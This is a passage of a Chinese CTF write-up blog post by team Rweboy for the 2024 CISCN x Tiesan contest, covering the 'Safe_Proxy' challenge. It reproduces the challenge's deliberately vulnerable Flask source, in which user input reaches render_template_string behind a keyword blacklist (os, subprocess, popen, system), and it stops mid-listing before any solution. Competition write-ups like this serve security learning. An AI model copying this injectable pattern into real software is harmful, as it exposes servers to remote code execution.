<!doctype html>
<html lang="zh"><head>
<title>2024 CISCNx铁三-WP-By Rweboy - “我不是二次元!”</title>
<meta name="msvalidate.01" content="1FF1CDAB89F73F47F09FDB7EE1059FDE" />
<meta name="google-site-verification" content="h9oKh1TF3yoRruKT3WlUVZjvkSiR172joz61JoqHXCM" />
<meta charset="UTF-8">
<meta name="keywords" content="">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">

<link rel="shortcut icon" href="/images/2.ico" type="image/x-icon" />
<meta name="description" content="一、战队信息战队名称：Rweboy 战队排名：19  二、解题过程WEB安全Safe_Proxy操作内容：题目一进去就给了源码,里面是一个简单的 ssti,但是无回显不出网 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061">
<meta property="og:type" content="article">
<meta property="og:title" content="2024 CISCNx铁三-WP-By Rweboy">
<meta property="og:url" content="https://m1racle-7.github.io/2024/12/16/2024%20CISCNx%E9%93%81%E4%B8%89-WP-By%20Rweboy/index.html">
<meta property="og:site_name" content="“我不是二次元!”">
<meta property="og:description" content="一、战队信息战队名称：Rweboy 战队排名：19  二、解题过程WEB安全Safe_Proxy操作内容：题目一进去就给了源码,里面是一个简单的 ssti,但是无回显不出网 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1734254046665-5ddd2390-36ac-4093-88b7-61f0b42284ed.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1734234677051-43d1ff8d-a21a-476c-8f32-e913701b37ee.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1734234714918-6c52a4f3-2b62-4848-bf8c-802ae1ebacdb.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1734241597752-aac4bae5-6ef2-48e1-bf3e-3345ce7f91cb.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1734241795642-72545efd-41e6-44a3-8e9e-4fbafa605ff2.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1734241883187-1e6ac8ab-8eba-4188-a4e5-d41e41a6256d.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1734241996388-62fb0953-d662-41ed-96fa-cb7b201d86ff.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1734242067415-5829b6a9-05b6-4819-a1ed-40156982253f.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1734242218096-b0999001-97a4-4601-aefa-d48de5be84fe.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1734242240715-2b96ae65-f88f-4ab1-aaa9-a0df5bcfb7a3.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1734242270703-4566649d-293f-43d3-b1bf-15c2ec63d013.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1734253788880-9f36fb15-9e9b-458a-8746-ac978452b067.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1734253897936-0ac8368a-2e9f-41ff-9312-94af06dfb6e6.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1734254038074-69e3a7c4-e631-49ba-899c-586ee8870aad.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1734254564522-b7afb0b4-240a-4720-ab02-1a6dcfcf7122.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1734254664677-630e59da-84ad-41d5-9d1f-5ba6c678780c.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1734255241504-31aef6a1-cecb-481a-89f5-78cd4caefc9d.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1734255536063-1a717558-e34e-45c6-8137-15e22310808e.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1734255493595-098e8f0f-ac24-4bd7-92ae-3ae65a5fda39.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1734258209173-cf6ddf6c-146b-4ec5-b634-5c3d22861721.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1734257139492-e7ee1776-c490-4fa7-812d-161562288405.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1734257267579-7e227194-27c4-4019-98fa-62d20d76d438.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1734257494761-24abf1fd-0abe-40b7-8df3-352649354548.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1734256758450-51cb147e-a210-4406-8eee-a538eb506649.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1734256529574-5efeae09-09d9-4682-af83-78f19a5f5f35.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1734256580184-427aad8d-f506-4361-89c6-1aabbc723db8.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1734256097650-5877b9e6-a82b-429b-a9ac-77dc4f3bd2de.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1734256063587-994fde2d-4d28-45dd-a90e-507873d14fb5.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1734256140314-b7fcd6eb-a369-4483-9d27-504a27c67f52.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1734256198739-cc123602-8ac4-4b87-934e-5ee893ee000f.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1734256225591-dfd62c07-8d10-4de0-befa-f3fd0a500736.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1734256317798-009103f2-dedd-49a0-a7e4-4740af32b70c.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1734255801863-aceced1b-dd05-48e7-a391-c610d339709d.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1734255881728-768bebb8-7819-4d93-bb9b-b80c6b6ab6b5.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1734258362721-6662ba63-b6dd-475e-b674-388f0620dfcd.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1734258776865-c09227a8-a9dd-49ac-9cb0-5dffeafca433.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/44199706/1734258951669-cc94d02e-0104-4cc0-9e05-898871007ad4.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1734259006581-53fccce5-80c0-4bf2-8e02-eb8798ae523a.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1734259093549-b40a73a7-146d-41dd-973a-44528ac750db.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1734259191720-a99bf4f0-e319-44c7-84ad-1faec919fb9a.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1734259657974-e84fab7f-0bda-412a-a3fc-95a09a3a7fe3.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1734259729052-10f7bd56-12e9-4e80-8662-d5abb5eb6e4f.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1734259884697-948511c4-8b1c-430b-bacb-ba6eb69c0c56.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/image-20241216091514431.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1734262616067-a34129a9-b3b2-435d-af08-cbd217ac9c10.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1734262183738-3a7b4430-a25e-42d8-8c18-7a34a14d775a.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1734255282688-430c1f40-6f47-43c2-955c-7dfbabd35833.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1734255382608-22e8dd73-9116-4882-89b0-d2ef79e6f687.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1734256195424-1d25e77a-0db3-4a8c-a323-d6e711655927.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1734256575334-e740c953-0c69-45d5-aa77-bb0f1ca17f6b.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1734256530134-9723124f-4fef-46c8-8b28-9f22fc71574a.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/44199706/1734256689818-025e92d7-9ce5-4df0-a3d4-10249722c748.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1734256873375-7f6781e5-880f-4b54-a3b0-66ae4b51e51c.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1734257626320-37017f92-e842-4901-8404-b4ad2375eef2.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1734257717486-12ab6437-768c-4bef-9a29-32a4cec41431.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1734257968913-c00eb899-1361-4c7d-abbd-88c5cf00e75d.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1734257837929-d2e86824-da78-4436-ad97-31922f0bbb38.png">
<meta property="article:published_time" content="2024-12-16T00:46:17.902Z">
<meta property="article:modified_time" content="2024-12-18T11:59:06.531Z">
<meta property="article:author" content="Miracle">
<meta property="article:tag" content="CTF">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1734254046665-5ddd2390-36ac-4093-88b7-61f0b42284ed.png">

<link rel="stylesheet" href="/lib/fancybox/fancybox.css">
<link rel="stylesheet" href="/lib/mdui_043tiny/mdui.css">


<link rel="stylesheet" href="/lib/iconfont/iconfont.css?v=1734523160440">

<link rel="stylesheet" href="/css/style.css?v=1734523160440">




    
        <link rel="stylesheet" href="/custom.css?v=1734523160440">
    



<script src="/lib/mdui_043tiny/mdui.js" async></script>
<script src="/lib/fancybox/fancybox.umd.js" async></script>
<script src="/lib/lax.min.js" async></script>


<script async src="/js/app.js?v=1734523160440"></script>

 

<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-4D4ZJ9G024"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag("js", new Date());

  gtag("config", "G-4D4ZJ9G024");
</script>


<link rel="stylesheet"  href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/atom-one-dark.min.css">
<meta name="generator" content="Hexo 7.3.0"></head><body class="nexmoe mdui-drawer-body-left"><div id="nexmoe-background"><div class="nexmoe-bg" style="background-image: url(/images/b.png)"></div><div class="mdui-appbar mdui-shadow-0"><div class="mdui-toolbar"><a class="mdui-btn mdui-btn-icon mdui-ripple" mdui-drawer="{target: &#039;#drawer&#039;, swipe: true}" title="menu"><i class="mdui-icon nexmoefont icon-menu"></i></a><div class="mdui-toolbar-spacer"></div><a class="mdui-btn mdui-btn-icon" href="/" title="Miracle"><img src="/images/a.jpg" alt="Miracle"></a></div></div></div><div id="nexmoe-header"><div class="nexmoe-drawer mdui-drawer" id="drawer">
    <div class="nexmoe-avatar mdui-ripple">
        <a href="/" title="Miracle">
            <img src="/images/a.jpg" alt="Miracle" alt="Miracle">
        </a>
    </div>
    <div class="nexmoe-count">
        <div><span>文章</span>9</div>
        <div><span>标签</span>4</div>
        <div><span>分类</span>4</div>
    </div>
    <div class="nexmoe-list mdui-list" mdui-collapse="{accordion: true}">
        
        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/" title="回到首页">
            <i class="mdui-list-item-icon nexmoefont icon-home"></i>
            <div class="mdui-list-item-content">
                回到首页
            </div>
        </a>
        
        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/archive.html" title="文章归档">
            <i class="mdui-list-item-icon nexmoefont icon-container"></i>
            <div class="mdui-list-item-content">
                文章归档
            </div>
        </a>
        
        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/PY.html" title="友链">
            <i class="mdui-list-item-icon nexmoefont icon-unorderedlist"></i>
            <div class="mdui-list-item-content">
                友链
            </div>
        </a>
        
    </div>
    
    
        
        <div class="nexmoe-widget-wrap">
    <div class="nexmoe-widget nexmoe-search">
        
            <form id="search_form">
                <label><input class="st-default-search-input" id="search_value" name="q" type="search" placeholder="搜索" style="
                    font-size: 15px !important;
                    height: 56px !important;
                    background-image: none;
                "></label>
            </form>
         
    </div>
</div>


	<script async src="/js/search.js?v=1734523160440"></script>



    
        
        
        
  <div class="nexmoe-widget-wrap">
    <h3 class="nexmoe-widget-title">文章分类</h3>
    <div class="nexmoe-widget">

      <ul class="category-list">

        


        

        

        <li class="category-list-item">
          <a class="category-list-link" href="/categories/CTF/">CTF</a>
          <span class="category-list-count">5</span>
        </li>

        

        <li class="category-list-item">
          <a class="category-list-link" href="/categories/PHP/">PHP</a>
          <span class="category-list-count">2</span>
        </li>

        

        <li class="category-list-item">
          <a class="category-list-link" href="/categories/linux/">linux</a>
          <span class="category-list-count">1</span>
        </li>

        

        <li class="category-list-item">
          <a class="category-list-link" href="/categories/内网/">内网</a>
          <span class="category-list-count">1</span>
        </li>

        
      </ul>

    </div>
  </div>


    
        
        
  <div class="nexmoe-widget-wrap">
    <div id="randomtagcloud" class="nexmoe-widget tagcloud nexmoe-rainbow">
      <a href="/tags/CTF/" style="font-size: 20px;">CTF</a> <a href="/tags/PHP/" style="font-size: 15px;">PHP</a> <a href="/tags/linux/" style="font-size: 10px;">linux</a> <a href="/tags/%E5%86%85%E7%BD%91/" style="font-size: 10px;">内网</a>
    </div>
    
      <script>
        var maxTagcloud = parseInt(17);
        var tags_length = parseInt(4);
        var tags_arr = [];
        for(var i = 0; i < tags_length; i++){
          tags_arr.push(i);
        }
        tags_arr.sort(function (l, r) {
          return Math.random() > 0.5 ? -1 : 1;
        });
        tags_arr = tags_arr.slice(0, maxTagcloud < tags_length ? tags_length - maxTagcloud : 0);
        for(var tag_i = 0; tag_i < tags_arr.length; tag_i++){
          document.getElementById("randomtagcloud").children[tags_arr[tag_i]].style.display = 'none';
        }
      </script>
    
  </div>

    
        
        
        
  <div class="nexmoe-widget-wrap">
    <h3 class="nexmoe-widget-title">文章归档</h3>
    <div class="nexmoe-widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/">2024</a><span class="archive-list-count">9</span></li></ul>
    </div>
  </div>



    
        
        
  <div class="nexmoe-widget-wrap">
    <h3 class="nexmoe-widget-title">最新文章</h3>
    <div class="nexmoe-widget">
      <ul>
        
          <li>
            <a href="/2024/12/16/2024%20CISCNx%E9%93%81%E4%B8%89-WP-By%20Rweboy/">2024 CISCNx铁三-WP-By Rweboy</a>
          </li>
        
          <li>
            <a href="/2024/11/11/2024%E9%B9%8F%E5%9F%8E%E6%9D%AFWP/">2024鹏城杯WP</a>
          </li>
        
          <li>
            <a href="/2024/11/04/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8Bkerberos%E8%AE%A4%E8%AF%81/">域渗透之Kerberos认证</a>
          </li>
        
          <li>
            <a href="/2024/10/30/%E7%BD%91%E9%BC%8E%E6%9D%AF-%E9%9D%92%E9%BE%99%E7%BB%84-WriteUp/">网鼎杯-青龙组WP</a>
          </li>
        
          <li>
            <a href="/2024/10/21/2024%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81WP/">2024强网拟态WP-- by MYGO!!!</a>
          </li>
        
      </ul>
    </div>
  </div>

    
   
    <div class="nexmoe-copyright">
        &copy; 2024 Miracle
        Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
        & <a href="https://github.com/theme-nexmoe/hexo-theme-nexmoe" target="_blank">Nexmoe</a>
        
        <div style="font-size: 13px">
            <link rel="stylesheet" href="https://widget.heweather.net/standard/static/css/he-standard.css?v=1.4.0"><script src="https://widget.heweather.net/standard/static/js/he-standard.js?v=1.4.0"></script><script async="" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
            本站总访问量  <a id="busuanzi_value_site_pv"></a> 次<br>
            本站访客数<a id="busuanzi_value_site_uv"></a>人次
    </div>
    </div>
</div><!-- .nexmoe-drawer --></div><div id="nexmoe-content"><div class="nexmoe-primary"><div class="nexmoe-post">
  <article>
    
        <div class="nexmoe-post-cover"> 
            <img src="/images/b.png" alt="2024 CISCNx铁三-WP-By Rweboy" loading="lazy">
            <h1>2024 CISCNx铁三-WP-By Rweboy</h1>
        </div>
    
    
    <div class="nexmoe-post-meta">
    <div class="nexmoe-rainbow">
        <a class="nexmoefont icon-calendar-fill">2024年12月16日</a>
        
            <a class="nexmoefont icon-appstore-fill -link" href="/categories/CTF/">CTF</a>
        
        
    <a><i class="nexmoefont icon-areachart"></i>约4.4k字</a>
    <a><i class="nexmoefont icon-time-circle-fill"></i>预计需要22分钟</a>

    </div>
    
    
    
    
    
</div>

    <h1 id="一、战队信息"><a href="#一、战队信息" class="headerlink" title="一、战队信息"></a>一、战队信息</h1><p>战队名称：Rweboy</p>
<p>战队排名：19</p>
<p><img src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1734254046665-5ddd2390-36ac-4093-88b7-61f0b42284ed.png"></p>
<h1 id="二、解题过程"><a href="#二、解题过程" class="headerlink" title="二、解题过程"></a>二、解题过程</h1><h2 id="WEB安全"><a href="#WEB安全" class="headerlink" title="WEB安全"></a><font style="color:black;">WEB安全</font></h2><h3 id="Safe-Proxy"><a href="#Safe-Proxy" class="headerlink" title="Safe_Proxy"></a>Safe_Proxy</h3><h4 id="操作内容："><a href="#操作内容：" class="headerlink" title="操作内容："></a>操作内容：</h4><p>题目一进去就给了源码,里面是一个简单的 ssti,但是无回显不出网</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask import Flask, request, render_template_string</span><br><span class="line">import socket</span><br><span class="line">import threading</span><br><span class="line">import html</span><br><span class="line"></span><br><span class="line">app = <span class="title function_ invoke__">Flask</span>(__name__)</span><br><span class="line"></span><br><span class="line">@app.<span class="title function_ invoke__">route</span>(<span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&quot;GET&quot;</span>])</span><br><span class="line">def <span class="title function_ invoke__">source</span>():</span><br><span class="line">    with <span class="title function_ invoke__">open</span>(__file__, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>+html.<span class="title function_ invoke__">escape</span>(f.<span class="title function_ invoke__">read</span>())+<span class="string">&#x27;&lt;/pre&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line">@app.<span class="title function_ invoke__">route</span>(<span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&quot;POST&quot;</span>])</span><br><span class="line">def <span class="title function_ invoke__">template</span>():</span><br><span class="line">    template_code = request.form.<span class="title function_ invoke__">get</span>(<span class="string">&quot;code&quot;</span>)</span><br><span class="line">    <span class="comment"># 安全过滤</span></span><br><span class="line">    blacklist = [<span class="string">&#x27;__&#x27;</span>, <span class="string">&#x27;import&#x27;</span>, <span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;subprocess&#x27;</span>, <span class="string">&#x27;popen&#x27;</span>, <span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> black in blacklist:</span><br><span class="line">        <span class="keyword">if</span> black in template_code:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Forbidden content detected!&quot;</span></span><br><span class="line">    result = <span class="title function_ invoke__">render_template_string</span>(template_code)</span><br><span class="line">    <span class="keyword">print</span>(result)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;ok&#x27;</span> <span class="keyword">if</span> result is not None <span class="keyword">else</span> <span class="string">&#x27;error&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HTTPProxyHandler</span>:</span></span><br><span class="line"><span class="class">    <span class="title">def</span> <span class="title">__init__</span>(<span class="title">self</span>, <span class="title">target_host</span>, <span class="title">target_port</span>):</span></span><br><span class="line"><span class="class">        <span class="title">self</span>.<span class="title">target_host</span> = <span class="title">target_host</span></span></span><br><span class="line"><span class="class">        <span class="title">self</span>.<span class="title">target_port</span> = <span class="title">target_port</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    <span class="title">def</span> <span class="title">handle_request</span>(<span class="title">self</span>, <span class="title">client_socket</span>):</span></span><br><span class="line"><span class="class">        <span class="title">try</span>:</span></span><br><span class="line"><span class="class">            <span class="title">request_data</span> = <span class="title">b</span>&quot;&quot;</span></span><br><span class="line"><span class="class">            <span class="title">while</span> <span class="title">True</span>:</span></span><br><span class="line"><span class="class">                <span class="title">chunk</span> = <span class="title">client_socket</span>.<span class="title">recv</span>(4096)</span></span><br><span class="line"><span class="class">                <span class="title">request_data</span> += <span class="title">chunk</span></span></span><br><span class="line"><span class="class">                <span class="title">if</span> <span class="title">len</span>(<span class="title">chunk</span>) &lt; 4096:</span></span><br><span class="line"><span class="class">                    <span class="title">break</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">            <span class="title">if</span> <span class="title">not</span> <span class="title">request_data</span>:</span></span><br><span class="line"><span class="class">                <span class="title">client_socket</span>.<span class="title">close</span>()</span></span><br><span class="line"><span class="class">                <span class="title">return</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">            <span class="title">with</span> <span class="title">socket</span>.<span class="title">socket</span>(<span class="title">socket</span>.<span class="title">AF_INET</span>, <span class="title">socket</span>.<span class="title">SOCK_STREAM</span>) <span class="title">as</span> <span class="title">proxy_socket</span>:</span></span><br><span class="line"><span class="class">                <span class="title">proxy_socket</span>.<span class="title">connect</span>((<span class="title">self</span>.<span class="title">target_host</span>, <span class="title">self</span>.<span class="title">target_port</span>))</span></span><br><span class="line"><span class="class">                <span class="title">proxy_socket</span>.<span class="title">sendall</span>(<span class="title">request_data</span>)</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">                <span class="title">response_data</span> = <span class="title">b</span>&quot;&quot;</span></span><br><span class="line"><span class="class">                <span class="title">while</span> <span class="title">True</span>:</span></span><br><span class="line"><span class="class">                    <span class="title">chunk</span> = <span class="title">proxy_socket</span>.<span class="title">recv</span>(4096)</span></span><br><span class="line"><span class="class">                    <span class="title">if</span> <span class="title">not</span> <span class="title">chunk</span>:</span></span><br><span class="line"><span class="class">                        <span class="title">break</span></span></span><br><span class="line"><span class="class">                    <span class="title">response_data</span> += <span class="title">chunk</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">            <span class="title">header_end</span> = <span class="title">response_data</span>.<span class="title">rfind</span>(<span class="title">b</span>&quot;\<span class="title">r</span>\<span class="title">n</span>\<span class="title">r</span>\<span class="title">n</span>&quot;)</span></span><br><span class="line"><span class="class">            <span class="title">if</span> <span class="title">header_end</span> != -1:</span></span><br><span class="line"><span class="class">                <span class="title">body</span> = <span class="title">response_data</span>[<span class="title">header_end</span> + 4:]</span></span><br><span class="line"><span class="class">            <span class="title">else</span>:</span></span><br><span class="line"><span class="class">                <span class="title">body</span> = <span class="title">response_data</span></span></span><br><span class="line"><span class="class">                </span></span><br><span class="line"><span class="class">            <span class="title">response_body</span> = <span class="title">body</span></span></span><br><span class="line"><span class="class">            <span class="title">response</span> = <span class="title">b</span>&quot;<span class="title">HTTP</span>/1.1 200 <span class="title">OK</span>\<span class="title">r</span>\<span class="title">n</span>&quot; \</span></span><br><span class="line"><span class="class">                       <span class="title">b</span>&quot;<span class="title">Content</span>-<span class="title">Length</span>: &quot; + <span class="title">str</span>(<span class="title">len</span>(<span class="title">response_body</span>)).<span class="title">encode</span>() + <span class="title">b</span>&quot;\<span class="title">r</span>\<span class="title">n</span>&quot; \</span></span><br><span class="line"><span class="class">                       <span class="title">b</span>&quot;<span class="title">Content</span>-<span class="title">Type</span>: <span class="title">text</span>/<span class="title">html</span>; <span class="title">charset</span>=<span class="title">utf</span>-8\<span class="title">r</span>\<span class="title">n</span>&quot; \</span></span><br><span class="line"><span class="class">                       <span class="title">b</span>&quot;\<span class="title">r</span>\<span class="title">n</span>&quot; + <span class="title">response_body</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">            <span class="title">client_socket</span>.<span class="title">sendall</span>(<span class="title">response</span>)</span></span><br><span class="line"><span class="class">        <span class="title">except</span> <span class="title">Exception</span> <span class="title">as</span> <span class="title">e</span>:</span></span><br><span class="line"><span class="class">            <span class="title">print</span>(<span class="title">f</span>&quot;<span class="title">Proxy</span> <span class="title">Error</span>: </span>&#123;e&#125;<span class="string">&quot;)</span></span><br><span class="line"><span class="string">        finally:</span></span><br><span class="line"><span class="string">            client_socket.close()</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">def start_proxy_server(host, port, target_host, target_port):</span></span><br><span class="line"><span class="string">    proxy_handler = HTTPProxyHandler(target_host, target_port)</span></span><br><span class="line"><span class="string">    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span></span><br><span class="line"><span class="string">    server_socket.bind((host, port))</span></span><br><span class="line"><span class="string">    server_socket.listen(100)</span></span><br><span class="line"><span class="string">    print(f&quot;</span>Proxy server is running on &#123;host&#125;:&#123;port&#125; <span class="keyword">and</span> forwarding to &#123;target_host&#125;:&#123;target_port&#125;...<span class="string">&quot;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    